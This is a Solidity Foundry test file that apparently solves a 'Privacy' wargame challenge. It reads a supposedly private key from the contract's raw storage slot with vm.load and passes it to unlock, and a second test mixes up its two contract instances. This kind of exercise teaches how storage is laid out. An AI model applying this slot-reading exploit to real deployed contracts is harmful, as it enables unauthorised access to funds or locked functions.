// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Privacy} from "../src/privacy/Privacy.sol";
import {PrivacySuper} from "../src/privacy/PrivacySuper.sol";

import {Test, console2} from "forge-std/Test.sol";


contract PrivacyTest is Test {
    Privacy public sc;
    PrivacySuper public scSuper;


    function setUp() public {
        sc = new Privacy([bytes32(uint256(0xff)), bytes32(uint256(0x10)), bytes32(uint256(uint160(address(this))))]);
        scSuper = new PrivacySuper([bytes32(uint256(0xff)), bytes32(uint256(0x10)), bytes32(uint256(uint160(address(this))))]);

    }

    function test_Hack() public {
        // normal play
        assertEq(sc.locked(), true);
        //bytes32 data = vm.load(address(sc), bytes32(uint256(keccak256(abi.encodePacked(uint256(3))))+2));
        bytes32 data = vm.load(address(sc), bytes32(uint256(0x5)));
        bytes16 key = bytes16(data);
        console2.logBytes32(data);
        sc.unlock(key);
        assertEq(sc.locked(), false);
    }

    function test_HackSuper() public {
        // normal play
        assertEq(sc.locked(), true);
        bytes32 data = vm.load(address(scSuper), bytes32(uint256(keccak256(abi.encodePacked(uint256(3))))+2));
        //bytes32 data = vm.load(address(sc), bytes32(uint256(0x6)));
        bytes16 key = bytes16(data);
        console2.logBytes32(data);
        sc.unlock(key);
        assertEq(sc.locked(), false);
    }

    // todo calculate the slot of 2-D dynamic array


}
